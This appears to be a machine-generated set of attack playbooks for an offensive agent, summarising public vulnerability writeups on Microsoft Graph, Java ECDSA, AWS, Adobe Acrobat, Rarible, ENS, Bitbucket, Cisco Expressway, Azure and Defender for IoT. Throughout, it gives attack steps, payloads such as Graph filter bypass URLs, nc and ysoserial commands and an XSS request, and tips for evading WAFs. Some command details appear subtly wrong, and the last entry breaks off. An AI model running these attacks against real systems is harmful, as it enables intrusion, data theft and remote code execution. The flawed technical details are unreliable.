trigger_conditions.when_to_apply: When an ODoH relay server is deployed and accessible, allowing arbitrary POST/GET requests to be made to any HTTP/HTTPS endpoint, including internal hosts.
prerequisites: A deployed and accessible instance of odoh-server-go acting as an ODoH relay.
applicability_signals: The server accepts POST/GET requests with valid Content-Type headers for ODoH payloads.
Documentation or behavior suggests the server forwards requests to arbitrary endpoints.
skip_if: The server implements strict validation on destination hosts, blocking requests to internal or unintended external IPs.

recon_steps: Step 1: Identify a public or internally accessible odoh-server-go instance configured as an ODoH relay.
Step 2: Send a basic ODoH query to confirm the relay is functional and responds as expected.
attack_steps: Step 1: Craft a POST request to the ODoH relay endpoint. The request body should contain a valid ODoH payload that specifies an external URL (e.g., a collaborator server for SSRF detection or an internal IP address) as the target for a DNS lookup.

Step 2: Observe the response from the ODoH relay server. If the target is an external server (like Burp Collaborator), check for incoming HTTP requests. If the target is an internal host, look for any indication of successful connection or information leakage in the relay's response or network logs if available.

Step 3: If a simple external URL doesn't trigger a callback, try different HTTP methods (GET) and content types, or attempt to access internal hostnames like `localhost`, `127.0.0.1`, or known internal IP ranges.
tools_recommended: Burp Suite (Collaborator client for SSRF callback detection)
curl (for crafting and sending custom requests)
success_indicators: An HTTP request is received at the attacker-controlled collaborator server when a malicious URL is specified in the ODoH payload.
The ODoH relay server's response indicates a successful connection to an internal host (e.g., HTTP status code from the internal host, leaked data).
failure_indicators: The ODoH relay returns an error or malformed response without any indication of reaching the target URL. Suggestion: Try different target hosts, ports, or protocols if the server implementation is not strictly enforcing only DNS traffic.

No callback is received on the collaborator server. Suggestion: Ensure the ODoH payload format is correct and that the server is configured to proxy arbitrary HTTP requests and not just DNS-over-HTTPS.

playbooks.impact: An attacker can leverage the ODoH relay to perform Server-Side Request Forgery (SSRF) attacks, allowing them to access internal network resources, interact with sensitive internal services, or probe internal hosts that would otherwise be inaccessible from the public internet.
playbooks.key_lesson: Validate that services designed to proxy requests, even with encrypted payloads, do not allow abuse for SSRF by implementing strict allowlists or deny lists for destination hosts.

meta.title: Gaining Unlimited access to graph AuditLogs endpoint using complex filters with non-privileged user account

trigger_conditions.when_to_apply: When an authenticated user can access their own audit logs and the application uses complex filter conditions, especially with lambda operators.
prerequisites: Attacker must have an authenticated account with access to their own audit logs.
applicability_signals: The /beta/auditLogs/signIns endpoint is accessible.
API responses for normal log retrieval return a 'User is not in the allowed roles' error when trying to access privileged information.
skip_if: API consistently returns 401/403 for all audit log requests regardless of filters.
No complex filtering options are available or documented for the API.

recon_steps: Step 1: Authenticate to the Microsoft Graph API with a non-privileged user account.
Step 2: Attempt to access own audit logs using basic filters to confirm the endpoint is functional and understand the expected response for authorized access.
attack_steps: Step 1: Send a GET request to `/beta/auditLogs/signIns` with a basic filter like `$filter=signInEventTypes/any(t: t eq 'interactiveUser')`.
Step 2: Observe the response. If a 'User is not in the allowed roles' message is received, proceed to the next step.

Step 3: Construct a complex filter query using lambda operators and multiple OR conditions. For example: `$filter=signInEventTypes/any(t: t eq 'interactiveUser' or t eq 'nonInteractiveUser' or userId eq '<ANOTHER_USER_ID>')`.
Step 4: Send the GET request with the crafted complex filter to `/beta/auditLogs/signIns`.
Step 5: Analyze the response for sensitive sign-in logs that would normally require administrative privileges.
payloads_or_patterns: https://graph.microsoft.com/beta/auditLogs/signIns?&$filter=signInEventTypes/any(t: t eq 'interactiveUser' or t eq 'nonInteractiveUser' or userId eq '<TARGET_USER_ID>')

https://graph.microsoft.com/beta/auditLogs/signIns?&$filter=signInEventTypes/any(t: t eq 'interactiveUser' or t eq 'nonInteractiveUser' or authenticationRequirement eq 'high') and datetime ge '2022-01-01T00:00:00Z'
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify HTTP requests, test different filter combinations.
curl: For direct API interaction and scripting.
success_indicators: Receiving a 200 OK response with a list of sign-in logs that do not belong to the authenticated user, and which normally require admin privileges to access.
The response contains sensitive information such as IP addresses, user agents, authentication methods, and user identifiers of other users.
failure_indicators: Consistently receiving 'User is not in the allowed roles' errors even with complex filters.
Receiving 401 Unauthorized or 403 Forbidden errors indicating a lack of authentication or authorization, regardless of filter complexity.

playbooks.impact: An unprivileged user can access sensitive sign-in logs of other users, potentially including administrators, leading to information disclosure and aiding further reconnaissance or privilege escalation attempts.
playbooks.key_lesson: When testing API authorization, always explore advanced filtering capabilities, especially those involving lambda expressions or complex logical operators, as they can bypass intended access controls.

meta.title: CVE-2022-21449: Psychic Signatures in Java

tech_stack_fingerprints: Usage of ECDSA signatures for SSL certificates, JWT, SAML assertions, OIDC id tokens, or WebAuthn

trigger_conditions.when_to_apply: When a target system utilizes ECDSA signatures for authentication or data integrity and is running a vulnerable version of Java without the April 2022 Critical Patch Update.
prerequisites: Target system must be using ECDSA signatures.
Target system must be running Java 15, 16, 17, or 18 prior to the April 2022 CPU.
applicability_signals: Target uses SSL certificates signed with ECDSA.
Target issues JWTs signed with ECDSA.
Target uses SAML assertions signed with ECDSA.
Target uses OIDC id tokens signed with ECDSA.
Target relies on WebAuthn authentication which uses ECDSA.
skip_if: Target system is running a patched version of Java.
Target system does not use ECDSA signatures for critical security functions.

recon_steps: Step 1: Identify the Java version running on the target server or services that handle security-sensitive operations.
Step 2: Determine if the target system relies on ECDSA signatures for any of the listed functionalities (SSL, JWT, SAML, OIDC, WebAuthn).
attack_steps: Step 1: Craft a forged ECDSA signature where both 'r' and 's' components are zero (appropriately encoded).
Step 2: Use this forged signature to sign a message or certificate that would normally require a valid ECDSA signature.
Step 3: Submit the forged signature to the target system for verification.
payloads_or_patterns: An ECDSA signature with r=0 and s=0. The exact byte representation will depend on the encoding (e.g., ASN.1 DER encoding). The writeup mentions 'appropriately encoded', implying a need to understand the specific encoding used by the Java implementation for r and s values.
tools_recommended: Custom scripting (e.g., Python with `cryptography` library) to generate forged ECDSA signatures.
Tools for crafting and sending network requests (e.g., `curl`, Burp Suite) to submit forged certificates or tokens.
success_indicators: The target system accepts the forged signature as valid.
Successfully forging an SSL certificate leads to man-in-the-middle capabilities.
Successfully forging a JWT, SAML assertion, or OIDC token grants unauthorized access or elevates privileges.
Successfully forging a WebAuthn authentication message bypasses multi-factor authentication.
failure_indicators: The target system rejects the forged signature with an error indicating invalid signature format or value. This might suggest the specific encoding is incorrect or the target's ECDSA implementation has additional checks not described.
A WAF or IDS blocks the request due to unusual signature patterns.

playbooks.impact: Attacker can forge ECDSA-signed data, leading to complete bypass of security mechanisms. This includes forging SSL certificates (allowing MITM), JWTs, SAML assertions, OIDC id tokens (leading to authentication bypass or privilege escalation), and WebAuthn authentication messages.
playbooks.key_lesson: Always verify that cryptographic libraries properly validate all components of digital signatures, especially edge cases like zero values for 'r' and 's' in ECDSA, as missing checks can lead to trivial bypasses.

meta.title: Psychic Signatures - what you need to know

tech_stack_fingerprints: Presence of vulnerable Oracle Java or OpenJDK versions (15-18)

trigger_conditions.when_to_apply: This vulnerability is applicable when the target system relies on ECDSA signatures for authentication or signature verification and is running a vulnerable version of Oracle Java or OpenJDK.
prerequisites: Target uses ECDSA signatures for critical tasks like authentication.
applicability_signals: Vulnerable Java/OpenJDK version detected.
skip_if: Target is not using ECDSA signatures for authentication or verification.
Target is running a patched version of Oracle Java or OpenJDK.

recon_steps: Step 1: Identify if the target system utilizes ECDSA signatures for authentication or data integrity checks.
Step 2: Determine the version of Oracle Java or OpenJDK running on the target system.
attack_steps: Step 1: Craft a malicious ECDSA signature that bypasses standard verification checks.
Step 2: Submit the crafted signature to the target system for validation.
tools_recommended: Insufficient detail in writeup
success_indicators: Signature checks are bypassed, allowing unauthorized access or validation of forged data.
failure_indicators: Signature checks are correctly performed, rejecting the malicious signature. This might indicate a patched system or correct implementation.
Insufficient detail in writeup

playbooks.impact: An attacker can bypass signature checks for ECDSA signatures, potentially leading to unauthorized access, data integrity compromise, or impersonation within systems that rely on these signatures for authentication or verification.
playbooks.key_lesson: Investigate cryptographic implementations, especially signature algorithms like ECDSA, for potential bypass vulnerabilities in systems using vulnerable versions of Java or OpenJDK.

meta.title: AWS's Log4Shell Hot Patch Vulnerable to Container Escape and Privilege Escalation

target_profile.technology: AWS hot patch solutions for Log4Shell

trigger_conditions.when_to_apply: When any of the AWS Log4Shell hot patch solutions are installed on a host or Kubernetes cluster, and the agent has the ability to run code within a container or as an unprivileged process on the host.
prerequisites: The target environment has one of the vulnerable AWS Log4Shell hot patch solutions installed.
applicability_signals: Observation of installed hot patch packages or DaemonSets related to Log4Shell remediation.
Ability to deploy a new container or execute code on the host.
skip_if: The hot patch has been upgraded to a fixed version.
The hot patch has been disabled.
The environment does not utilize AWS compute services or equivalent container orchestration platforms where these patches might be applied.

recon_steps: Step 1: Identify if AWS Log4Shell hot patch solutions (e.g., `log4j-cve-2021-44228-hotpatch`, `kubernetes-cve-2021-44228-node-agent`, `Hotdog`) are deployed on the target environment. This might involve checking package managers on hosts or inspecting Kubernetes cluster configurations for DaemonSets.

Step 2: Confirm the specific version of the hot patch solution in use. If the version is not 1.1-16 or earlier for the RPM/DaemonSet, or not version 1.02 or earlier for Hotdog, the vulnerability may be patched.
attack_steps: Step 1: Deploy a new, unprivileged container within the affected environment (e.g., Kubernetes cluster, ECS cluster).
Step 2: If direct code execution on the host is possible for an unprivileged process, attempt to exploit the patch.
Step 3: Attempt to leverage the vulnerable hot patch mechanism to escape the container's isolation or escalate privileges to root on the host.
payloads_or_patterns: Exploitation involves interacting with the hot patch mechanism, likely through specific system calls or inter-process communication that the hot patch service intercepts. The exact payload will depend on the specific hot patch implementation and the mechanism it uses for patching. For example, attempts could be made to trigger Log4j exploitation patterns in a way that the hot patch improperly handles, leading to escape. Alternatively, direct interaction with the hot patch service's privileged operations could be attempted.
Example PoC interaction might involve trying to write to sensitive host files or execute commands via the hot patch service's expected behavior, but in an unintended way.
tools_recommended: kubectl: To deploy test pods/containers in Kubernetes and inspect DaemonSets.
Docker: To build and run test containers.
SSH: For direct host access if available.
System monitoring tools (e.g., `strace`, `ltrace`): To observe interactions with the hot patch service.
success_indicators: Successful container escape, indicated by the ability to access or modify files on the host system outside the container's isolated filesystem.
Privilege escalation to root code execution on the host.
Successful execution of commands on the host from within a container.
failure_indicators: Container remains isolated, and no unauthorized access to host resources is possible.
Commands executed within the container do not result in privileged execution or host access.
Errors or denials of service when attempting to interact with the hot patch mechanism, suggesting it's either not present or patched.

playbooks.impact: An attacker can escape containers to gain control over the underlying host, or escalate privileges from an unprivileged process to root. This allows for complete compromise of the affected host and any other workloads running on it.
playbooks.key_lesson: Always verify the version and patching status of critical security hotfixes, as even vendor-provided solutions can introduce new vulnerabilities.

meta.title: Adobe Acrobat hollowing out same-origin policy
meta.category: XSS, SOP bypass, Open redirect, postMessage

trigger_conditions.when_to_apply: When the Adobe Acrobat browser extension is installed and intercepts PDF file requests, redirecting to its own viewer hosted on Adobe Document Cloud, and allows third-party websites to abuse privileges granted to documentcloud.adobe.com.
prerequisites: User has the Adobe Acrobat browser extension installed.
The extension is configured to intercept PDF file requests.
applicability_signals: Navigating to a PDF URL (e.g., https://example.com/test.pdf) redirects to chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html?pdfurl=...
The extension's viewer.html loads https://documentcloud.adobe.com/proxy/chrome-viewer/index.html in an iframe.
skip_if: The Adobe Acrobat extension is not installed or disabled.
The extension does not intercept PDF file navigations.

recon_steps: Step 1: Identify if the Adobe Acrobat browser extension is installed and active by navigating to PDF URLs and observing redirection behavior.
Step 2: Analyze the redirected URL to confirm it points to `chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html` with a `pdfurl` parameter.
attack_steps: Step 1: Construct a malicious HTML page hosted on a third-party domain (e.g., `evil.com`).
Step 2: Within this page, create an iframe or a link that targets `chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html`.
Step 3: Set the `pdfurl` parameter of the viewer.html to a target URL that is intended to be proxied or accessed by the Adobe Document Cloud application.

Step 4: Inject malicious JavaScript within the context of the `evil.com` domain that attempts to communicate with the `documentcloud.adobe.com` iframe using `window.postMessage` to trigger actions or extract data that bypasses SOP.

Step 5: Analyze the network traffic and server logs on `evil.com` for any callbacks or observable responses indicating successful data exfiltration or actions performed by the Adobe Document Cloud application due to the injected script.
payloads_or_patterns: <script>window.addEventListener('message', function(event) { /* Analyze event.data for sensitive info */ }); window.frames[0].postMessage('some_command', 'https://documentcloud.adobe.com');</script>
tools_recommended: Burp Suite: To capture and analyze network traffic, especially for postMessage interactions and potential callbacks.
Custom HTML/JavaScript: To host the malicious page and craft the postMessage payloads.
success_indicators: Observable data leakage in the `event.data` of the `postMessage` listener on the attacker's domain.
Unexpected network requests originating from `documentcloud.adobe.com` to sensitive internal resources if the `pdfurl` was crafted to point there.
Successful exfiltration of information that should have been protected by SOP.
failure_indicators: No redirection occurs when accessing PDF files.
The `postMessage` communication fails or does not yield any data.
Security headers or filters prevent the cross-origin communication or access to the target URL.
The `pdfurl` parameter is sanitized or ignored, preventing the intended access.

playbooks.impact: A remote attacker can potentially bypass the Same-Origin Policy and gain access to sensitive information or perform actions within the context of the Adobe Document Cloud web application by tricking a victim with the Adobe Acrobat browser extension installed into visiting a malicious website.
playbooks.key_lesson: When an extension grants cross-origin capabilities to a web application hosted on a third-party domain (documentcloud.adobe.com in this case), investigate the communication channels (like window.postMessage) for potential SOP bypasses by injecting content from other origins.

meta.title: Palisade identifies Wormable Cross-Site Scripting Vulnerability affecting Rarible’s NFT Marketplace

trigger_conditions.when_to_apply: When an authenticated user can update their profile and the 'photo' parameter is not properly sanitized for HTML/JavaScript injection.
prerequisites: Attacker must have an authenticated session on Rarible.
Target must have a profile update endpoint that accepts a 'photo' parameter.
applicability_signals: The existence of a user profile update API endpoint (e.g., /marketplace/api/v4/users/<WALLET_ADDRESS>).
Observation that the 'photo' parameter accepts arbitrary string input without sufficient sanitization.
skip_if: WAF blocks all attempts to inject script tags or common XSS payloads.
Profile updates fail consistently regardless of input for the 'photo' parameter.

recon_steps: Step 1: Identify authenticated user profile update API endpoints by observing network traffic during profile edits.
Step 2: Analyze the parameters accepted by the profile update endpoint, paying close attention to parameters like 'photo' or 'avatar'.
attack_steps: Step 1: Send a POST request to the user profile update endpoint (e.g., /marketplace/api/v4/users/<ATTACKER_WALLET_ADDRESS>) with a valid JWT token and public key.
Step 2: In the request body, include a JSON payload with a crafted 'photo' parameter containing a base64-encoded iframe pointing to a data URL with JavaScript.
Step 3: Inspect the victim's profile page after they view it. If the XSS is successful, the injected JavaScript will execute in the victim's browser.
payloads_or_patterns:
POST /marketplace/api/v4/users/<ATTACKER_WALLET_ADDRESS> HTTP/2
Host: api-mainnet.rarible.com
Content-Type: application/json
Authorization: Bearer <JWT_TOKEN>

{
  "signature": "<WALLET_SIGNATURE>",
  "publicKey": "<ATTACKER_WALLET_ADDRESS>",
  "photo": "<IFRAME_SRC_DATA_URL_BASE64>"
}
tools_recommended: Burp Suite: To intercept and modify HTTP requests for profile updates.
Browser Developer Tools: To analyze network traffic and response payloads.
success_indicators: JavaScript execution in the victim's browser when they visit the attacker's profile page (e.g., an alert box pops up).
Observation of malicious scripts being loaded or executed from the trusted rarible.com domain in the victim's browser console.
Successful manipulation of smart contract interactions or metadata after a victim views the compromised profile.
failure_indicators: Profile update fails with an error message indicating invalid input for the 'photo' parameter.
WAF blocks the request and returns a 403 Forbidden status code.
No JavaScript execution observed when a victim views the profile, suggesting sanitization or blocking.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser on rarible.com. This can lead to session hijacking, theft of sensitive information (e.g., private keys used for wallet interactions), manipulation of NFT transactions (e.g., altering recipient addresses, prices, or approving tokens), and self-propagation of the vulnerability to other users.
playbooks.key_lesson: Always sanitize and validate user-provided input for profile pictures and other user-generated content to prevent XSS, especially when these inputs are rendered directly in the browser or used in sensitive operations like blockchain transactions.

meta.title: How we spoofed ENS domains for $15k

trigger_conditions.when_to_apply: When the ENS metadata service incorrectly normalizes or displays domain names containing special characters or subdomains that visually resemble legitimate ones.
prerequisites: The target ENS metadata service must be in use by a frontend application or marketplace.
applicability_signals: The ENS smart contract stores hashes, not plain text domain names.
The metadata service is responsible for deriving the original name from the hash.
The writeup mentions specific spoofing vectors like homographs, uppercase letters, and subdomains with dots.
skip_if: The ENS metadata service has been patched to correctly handle all domain normalization edge cases.
Frontend applications using ENS names display warnings for all non-standard domain representations.

recon_steps: Step 1: Investigate the ENS metadata service API (`https://metadata.ens.domains/mainnet/<name_id>/`) to understand how domain names are derived from name IDs.
Step 2: Analyze the ENS name registration rules and hash calculation methods (Keccak-256) as described in the writeup.
Step 3: Identify potential characters or subdomain structures that could lead to visual spoofing (e.g., homoglyphs, uppercase letters, dots in subdomains).
attack_steps: Step 1: Attempt to register an ENS domain that exploits a known spoofing vector (e.g., using a subdomain that visually resembles a legitimate domain, like `eth-usd.data.eth` when `data.eth` is owned by Chainlink).
Step 2: Check how the ENS metadata service renders the registered domain name via its API.
Step 3: Observe if NFT marketplaces (like OpenSea, LooksRare) that rely on the metadata service display the spoofed domain name without appropriate warnings.
payloads_or_patterns: Domain registration payload: `{name: "eth-usd.data.eth"}` (example from writeup, actual registration involves smart contract interaction)
tools_recommended: ENS registrar (e.g., via MyEtherWallet, MetaMask)
Web3 interaction tools (e.g., ethers.js, web3.js)
Browser developer tools to inspect API responses from metadata.ens.domains
NFT marketplace UIs (OpenSea, LooksRare) to view registered domains
success_indicators: The ENS metadata service returns a normalized name that visually spoofs a legitimate domain (e.g., `eth-usd.data.eth` being displayed when it's not the intended structure).
NFT marketplaces display the spoofed domain name without warnings or flags.
Users are tricked into believing they are interacting with a legitimate domain or asset due to the visual resemblance.
failure_indicators: The ENS metadata service correctly identifies and flags the domain as invalid or non-normalized.
NFT marketplaces display appropriate warnings for spoofed domain names.
The smart contract rejects the registration of the spoofed domain name.

playbooks.impact: An attacker can register ENS domains that visually impersonate legitimate domains, leading to phishing attacks, fraud, and loss of funds for users who are tricked into interacting with spoofed assets or services.
playbooks.key_lesson: Always verify ENS domain registration and rendering logic by testing edge cases with special characters, homoglyphs, and subdomain structures, as the underlying hash-based storage can lead to unexpected visual representations.

meta.title: CVE-2022-26133 - Bitbucket Data Center - Java Deserialization Vulnerability

tech_stack_fingerprints: Bitbucket Data Center makes use of Hazelcast

trigger_conditions.when_to_apply: When the Hazelcast port (default 5701) of a Bitbucket Data Center instance is accessible over the network from an attacker-controlled machine.
prerequisites: Hazelcast port (default 5701) is reachable from the attacker's IP.
applicability_signals: Bitbucket Data Center instance is running.
Port 5701 is open and listening.
skip_if: Hazelcast port is not reachable (e.g., blocked by firewall).
Bitbucket Data Center is not deployed.

recon_steps: Step 1: Perform network scanning to identify open ports on the target Bitbucket Data Center instance. Look for port 5701 (Hazelcast default).
Step 2: If port 5701 is open, send a dummy probe packet to retrieve the cluster name. Example: printf "\x00\x00\x00\x02\x73\x61" | nc -nv <TARGET_IP> 5701
attack_steps: Step 1: Obtain the Bitbucket cluster name by sending a probe packet to the Hazelcast port (e.g., 5701) and capturing the response.
Step 2: Generate a serialized payload using a Java deserialization gadget (e.g., CommonsBeanutils1) with `ysoserial`. The payload should target remote code execution.

Step 3: Construct a malicious packet by prepending the size of the group name (4 bytes), the group name (Bitbucket cluster name), and the serialized payload. The packet structure is: `size of group name (4 bytes) | group name of Bitbucket cluster | 0xFF 0xFF 0xFF 0x9C | serialized payload`.
Step 4: Send the constructed malicious packet to the Hazelcast port of the Bitbucket Data Center instance.
payloads_or_patterns: printf "\x00\x00\x00\x02\x73\x61" | nc -nv <TARGET_IP> 5701 > cluster-name.bin  (to get cluster name)
ysoserial -g CommonsBeanutils1 -o javaserialization -p "<BITBUCKET_CLUSTER_NAME>" > payload.bin  (example payload generation)

Build packet: echo -en "\x00\x00\x00\x02\x73\x61" | cat - payload.bin > malformed_packet.bin  (This is a simplified example; actual packet construction will vary based on cluster name and payload format.)
tools_recommended: netcat (nc) for sending probe packets.
ysoserial for generating Java deserialization payloads.
Custom script (like the one in the writeup) for packet construction and sending.
success_indicators: Remote code execution on the Bitbucket Data Center node, demonstrated by command output or established shell.
Bitbucket Data Center responds with an unexpected error or behavior indicative of payload deserialization.
failure_indicators: No response or connection refused from the Hazelcast port (indicates port is closed or unreachable).
Receive standard responses without RCE indicators (indicates no successful deserialization or payload malfunction).
WAF blocking the connection or payload (try obfuscating the payload or using a different gadget).

playbooks.impact: Remote Code Execution (RCE) on the Bitbucket Data Center server, allowing an attacker to compromise the server and potentially access sensitive data or perform other malicious actions.
playbooks.key_lesson: Always investigate network-accessible ports, especially those related to clustering or inter-node communication (like Hazelcast on port 5701), as they can be entry points for RCE vulnerabilities if not properly secured or authenticated.

meta.title: Multiple Vulnerabilities in Cisco Expressway

trigger_conditions.when_to_apply: The target must be running Cisco Expressway with the TURN server enabled on port 3478, and the server must be configured to allow relaying of traffic.
prerequisites: TURN server is enabled on port 3478.
The TURN server is reachable from the attacker's network.
applicability_signals: Service responding on UDP/TCP port 3478.
STUN/TURN protocol handshake initiated by the target.
skip_if: No service listening on UDP/TCP port 3478.
Firewall blocking access to port 3478.

recon_steps: Step 1: Scan UDP and TCP port 3478 on the target's IP address to identify listening services.
Step 2: Attempt to initiate a STUN/TURN handshake on port 3478 to confirm the protocol.
attack_steps: Step 1: Send a STUN 'Allocate' request to the TURN server on port 3478. This request includes attributes to define the desired allocation properties.
Step 2: In the 'Allocate' request, craft the 'Requested Transport Protocol' attribute to be UDP.

Step 3: After receiving a successful 'Allocate' response, send a STUN 'CreatePermission' request. In this request, specify the 'Destination IP Address' and 'Destination Port' to an internal IP address and port reachable via the TURN server. This attempts to establish a permission to relay traffic to that internal destination.
Step 4: If the 'CreatePermission' request is successful, send a STUN 'ChannelBind' request. This binds a channel to the previously created permission, allowing data to be sent through it.

Step 5: Send UDP packets to the allocated IP address and port provided by the TURN server in the 'Allocate' response. These packets will be relayed to the internal destination specified in the 'CreatePermission' request.
payloads_or_patterns: STUN CreatePermission Request (with internal IP/port as destination)
tools_recommended: stunner tool (as provided in the writeup)
Scapy for crafting custom UDP packets
Nmap for port scanning
success_indicators: Receipt of a TURN server response indicating successful allocation and permission creation.
Observing network traffic originating from the internal IP address to the attacker-controlled endpoint.
If the target internal service responds, the response packet is relayed back to the attacker.
failure_indicators: No response on port 3478, or non-STUN/TURN traffic.
STUN 'Allocate' or 'CreatePermission' requests failing with an error code indicating invalid parameters or lack of permission.
No observed traffic originating from the internal network or no relayed response.

playbooks.impact: An attacker can relay arbitrary UDP traffic through the Cisco Expressway's TURN server to internal IP addresses and ports, potentially leading to SSRF attacks, internal network reconnaissance, or exploitation of other internal services.
playbooks.key_lesson: Always validate that TURN servers restrict relayed traffic to explicitly permitted external destinations and do not allow arbitrary internal IP/port forwarding.

meta.title: Abusing Azure Hybrid Workers for Privilege Escalation – Part 2

trigger_conditions.when_to_apply: When an attacker has the ability to execute code on a system that is registered as an Azure Hybrid Worker.
prerequisites: Attacker has authenticated access to an Azure environment.
Attacker has the ability to execute code on a machine designated as an Azure Hybrid Worker.
The Hybrid Worker is configured to execute commands with elevated privileges.
applicability_signals: Presence of Azure Hybrid Worker agents/services on a compromised host.
Ability to interact with Azure Automation or other services that leverage Hybrid Workers.
skip_if: The Hybrid Worker is configured to run with low-privileged service accounts.
Network egress filtering prevents communication with Azure services.

recon_steps: Step 1: Identify systems acting as Azure Hybrid Workers within the target Azure environment.
Step 2: On a compromised host that is an Azure Hybrid Worker, investigate its configuration and the identity under which the Hybrid Worker service is running.
attack_steps: Step 1: Gain code execution on a compromised host that functions as an Azure Hybrid Worker.
Step 2: Craft a malicious script or payload that leverages the Hybrid Worker's capabilities to execute commands on Azure resources with escalated privileges.
Step 3: Register this malicious script or command with the Azure Hybrid Worker. This might involve interacting with Azure Automation Runbooks or similar services.
Step 4: Trigger the execution of the malicious script/command via the Hybrid Worker, targeting sensitive Azure resources or performing privileged operations.
tools_recommended: PowerShell or other scripting languages for payload creation
Azure CLI or Azure PowerShell for interacting with Azure resources
success_indicators: Successful execution of privileged commands on Azure resources.
Unauthorized access or modification of sensitive Azure data.
Creation or modification of Azure resources with elevated permissions.
failure_indicators: Hybrid Worker service refuses to execute the payload.
Commands fail with permission errors.
Azure monitoring/logging detects and alerts on the anomalous activity.

playbooks.impact: Attain elevated privileges within the Azure environment, enabling unauthorized access, modification, or deletion of resources and data. This could lead to full compromise of the Azure subscription.
playbooks.key_lesson: When an Azure Hybrid Worker is present and an attacker can achieve code execution on its host, treat it as a potential pivot point for privilege escalation within Azure.

meta.title: Inside the Black Box | How We Fuzzed Microsoft Defender for IoT and Found Multiple Vulnerabilities

trigger_conditions.when_to_apply: When the target is Microsoft Defender for IoT and network dissectors are being used to inspect traffic. This technique is primarily applicable in a black-box or grey-box scenario where source code is not readily available.
prerequisites: Network traffic can be sent to the Microsoft Defender for IoT sensor.
applicability_signals: Microsoft Defender for IoT deployed and configured.
Deep Packet Inspection (DPI) is enabled and processing network traffic.
The horizon-parser container is running.
skip_if: The target is not Microsoft Defender for IoT.
DPI functionality is disabled or not in use.

recon_steps: Step 1: Identify the Microsoft Defender for IoT deployment and its network sensor components. Observe network traffic flowing to and from the sensor.
Step 2: Confirm the presence and operation of the 'horizon-parser' Docker container on the sensor machine.
attack_steps: Step 1: Develop a fuzzer that targets the network dissectors loaded by the horizon daemon.
Step 2: Utilize binary instrumentation (e.g., AFL) to instrument the horizon daemon or its loaded dissector libraries.
Step 3: Craft diverse and malformed network packets based on known protocol structures or generated by a fuzzer.
Step 4: Inject these crafted packets into the network traffic being processed by the Microsoft Defender for IoT sensor.
Step 5: Monitor the horizon-parser container and the sensor system for crashes, unexpected behavior, or resource exhaustion, indicating potential memory corruption or DoS vulnerabilities.
Step 6: Analyze any identified crashes to pinpoint the vulnerable dissector and the specific input that triggered the issue.
payloads_or_patterns: Fuzzing inputs generated by AFL or custom fuzzing tools, targeting various network protocols (e.g., TCP, UDP, FTP, SMB, etc.) with malformed or unexpected data structures.
tools_recommended: AFL++ (American Fuzzy Lop) for efficient fuzzing.
Custom scripting for packet generation and injection.
IDA Pro or Ghidra for binary analysis (if limited symbols are available).
